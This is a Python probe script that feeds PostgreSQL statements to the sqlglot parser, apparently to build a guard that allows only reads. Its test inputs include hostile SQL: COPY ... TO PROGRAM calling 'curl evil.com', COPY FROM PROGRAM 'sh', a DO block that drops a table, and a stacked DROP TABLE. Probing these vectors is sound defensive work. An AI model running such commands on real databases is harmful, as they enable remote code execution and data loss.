"""Second probe: PG-specific write-via-read vectors and class hierarchy."""
import sqlglot
from sqlglot import exp, parse

print("=== class hierarchy ===")
print("Select   -> Query?", issubclass(exp.Select, exp.Query))
print("Union    -> Query?", issubclass(exp.Union, exp.Query))
print("Intersect-> Query?", issubclass(exp.Intersect, exp.Query))
print("Except   -> Query?", issubclass(exp.Except, exp.Query))
print("Subquery -> Query?", issubclass(exp.Subquery, exp.Query))
print("Values   -> Query?", issubclass(exp.Values, exp.Query))
print("has exp.Semicolon?", hasattr(exp, "Semicolon"))
print("has exp.TruncateTable?", hasattr(exp, "TruncateTable"))
print("has exp.Command?", hasattr(exp, "Command"))
print("has exp.Copy?", hasattr(exp, "Copy"))
print("has exp.Transaction?", hasattr(exp, "Transaction"))

print()
print("=== SELECT INTO (creates a table) ===")
for sql in ["SELECT * INTO newtbl FROM orders", "SELECT * INTO TEMP t FROM orders"]:
    ast = sqlglot.parse_one(sql, read="postgres")
    print(repr(sql), "-> top:", type(ast).__name__, "| into arg:", ast.args.get("into"))

print()
print("=== FOR UPDATE / locking reads ===")
for sql in ["SELECT * FROM orders FOR UPDATE", "SELECT * FROM orders FOR SHARE"]:
    ast = sqlglot.parse_one(sql, read="postgres")
    print(repr(sql), "-> locks:", ast.args.get("locks"))

print()
print("=== data-modifying CTE (writes via WITH) ===")
sql = "WITH d AS (DELETE FROM orders RETURNING *) SELECT * FROM d"
ast = sqlglot.parse_one(sql, read="postgres")
print(repr(sql))
print("  top:", type(ast).__name__)
print("  find_all Delete:", [type(n).__name__ for n in ast.find_all(exp.Delete)])
print("  find_all Update:", [type(n).__name__ for n in ast.find_all(exp.Update)])
sql2 = "WITH i AS (INSERT INTO orders VALUES (1) RETURNING *) SELECT * FROM i"
ast2 = sqlglot.parse_one(sql2, read="postgres")
print("  INSERT-CTE find_all Insert:", [type(n).__name__ for n in ast2.find_all(exp.Insert)])

print()
print("=== COPY ... TO PROGRAM (RCE vector) ===")
for sql in ["COPY orders TO PROGRAM 'curl evil.com'", "COPY orders FROM PROGRAM 'sh'"]:
    try:
        ast = sqlglot.parse_one(sql, read="postgres")
        print(repr(sql), "-> top:", type(ast).__name__)
    except Exception as e:
        print(repr(sql), "-> ERROR:", type(e).__name__, e)

print()
print("=== DO block / dollar-quote ===")
sql = "DO $$ BEGIN EXECUTE 'DROP TABLE orders'; END $$"
ast = sqlglot.parse_one(sql, read="postgres")
print(repr(sql), "-> top:", type(ast).__name__)

print()
print("=== top-level Subquery / set ops ===")
print("(SELECT 1) ->", type(sqlglot.parse_one("(SELECT 1)", read="postgres")).__name__)
print("SELECT 1 INTERSECT SELECT 2 ->", type(sqlglot.parse_one("SELECT 1 INTERSECT SELECT 2", read="postgres")).__name__)
print("SELECT 1 EXCEPT SELECT 2 ->", type(sqlglot.parse_one("SELECT 1 EXCEPT SELECT 2", read="postgres")).__name__)

print()
print("=== nested table extraction excludes CTE names; find_all on set ops ===")
ast = sqlglot.parse_one("SELECT * FROM orders UNION SELECT * FROM secrets", read="postgres")
print("UNION tables:", [t.name for t in ast.find_all(exp.Table)])

print()
print("=== parse() returning None/Semicolon types ===")
for sql in ["SELECT 1;;", ";SELECT 1", "SELECT 1;/**/DROP TABLE x"]:
    stmts = parse(sql, read="postgres")
    print(repr(sql), "->", [(type(s).__name__ if s is not None else "None") for s in stmts])

print()
print("=== normalize_identifiers on full query, then read table (db,name) ===")
from sqlglot.optimizer.normalize_identifiers import normalize_identifiers
for sql in ["SELECT * FROM Orders", 'SELECT * FROM "Orders"', "SELECT * FROM public.orders",
            "SELECT * FROM other.secrets", 'SELECT * FROM "secrets"']:
    ast = normalize_identifiers(sqlglot.parse_one(sql, read="postgres"), dialect="postgres")
    t = list(ast.find_all(exp.Table))[0]
    print(f"{sql:38s} -> db={t.db!r:12s} name={t.name!r}")

print()
print("=== column extraction ===")
ast = sqlglot.parse_one("SELECT id, orders.secret, * FROM orders", read="postgres")
for c in ast.find_all(exp.Column):
    print("  column:", repr(c.name), "table-qualifier:", repr(c.table))
print("  has Star?", bool(list(ast.find_all(exp.Star))))

print()
print("=== top-level FROM relation count (cartesian) ===")
def relations(ast):
    f = ast.args.get("from")
    rels = []
    if f:
        rels.append(f.this)
    for j in ast.args.get("joins") or []:
        rels.append(j)
    return rels
for sql in ["SELECT * FROM a, b, c", "SELECT * FROM a JOIN b ON a.id=b.id", "SELECT * FROM a"]:
    ast = sqlglot.parse_one(sql, read="postgres")
    joins = ast.args.get("joins") or []
    print(repr(sql), "| from:", ast.args.get("from").this.name if ast.args.get("from") else None,
          "| joins:", [(type(j.this).__name__, "on" if j.args.get("on") else ("using" if j.args.get("using") else "BARE"), j.kind, j.side) for j in joins])
